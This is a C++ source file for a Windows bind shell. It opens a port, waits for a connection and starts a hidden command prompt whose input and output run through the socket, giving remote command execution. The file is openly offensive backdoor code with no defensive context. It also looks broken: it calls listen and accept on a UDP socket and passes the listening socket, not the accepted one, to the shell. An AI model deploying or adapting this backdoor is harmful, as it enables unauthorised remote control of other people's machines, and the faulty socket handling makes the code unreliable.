// bind_udp.cpp : 此檔案包含 'main' 函式。程式會於該處開始執行及結束執行。
//
# ifndef UNICODE
#define UNICODE
#endif

#define WIN32_LEAN_AND_MEAN

#include <WinSock2.h>
#pragma comment(lib, "WS2_32.lib")
#include <windows.h>
#include <tchar.h>
#include <WS2tcpip.h>
#include <stdio.h>

int _tmain(INT argc, LPTSTR argv[])
{
	WSADATA wsaData;
	sockaddr_in sockaddr;
	PROCESS_INFORMATION ProcessInfo;
	STARTUPINFO StartupInfo;

	UINT Port = 999;
	if (argc == 2) {
		Port = _tstoi(argv[1]);
	}

	ZeroMemory(&ProcessInfo,
		sizeof(PROCESS_INFORMATION));
	ZeroMemory(&StartupInfo,
		sizeof(STARTUPINFO));
	ZeroMemory(&wsaData,
		sizeof(WSADATA));

	WSAStartup(MAKEWORD(2, 2), &wsaData);

	TCHAR szCMDPath[255];
	GetEnvironmentVariable(
		TEXT("COMSPEC"),
		szCMDPath,
		sizeof(szCMDPath));

	sockaddr.sin_family = AF_INET;
	sockaddr.sin_port = htons(Port);
	sockaddr.sin_addr.S_un.S_addr = INADDR_ANY;

	SOCKET CSocket = socket(
		AF_INET,
		SOCK_DGRAM,
		IPPROTO_UDP);
	bind(CSocket,
		(SOCKADDR*)&sockaddr,
		sizeof(sockaddr));
	listen(CSocket, 1);
	int iAddrSize = sizeof(sockaddr);

	SOCKET SSocket = WSAAccept(
		CSocket,
		(SOCKADDR*)&sockaddr,
		&iAddrSize,
		NULL,
		NULL);

	
	StartupInfo.cb = sizeof(STARTUPINFO);
	StartupInfo.wShowWindow = SW_HIDE;
	StartupInfo.dwFlags =
		STARTF_USESTDHANDLES |
		STARTF_USESHOWWINDOW;
	StartupInfo.hStdOutput = (HANDLE)CSocket;
	StartupInfo.hStdInput = (HANDLE)CSocket;
	StartupInfo.hStdError = (HANDLE)CSocket;

	CreateProcess(NULL,
		szCMDPath,
		NULL,
		NULL,
		TRUE,
		0,
		NULL,
		NULL,
		&StartupInfo,
		&ProcessInfo);

	closesocket(CSocket);
	WSACleanup();
	return 0;
}
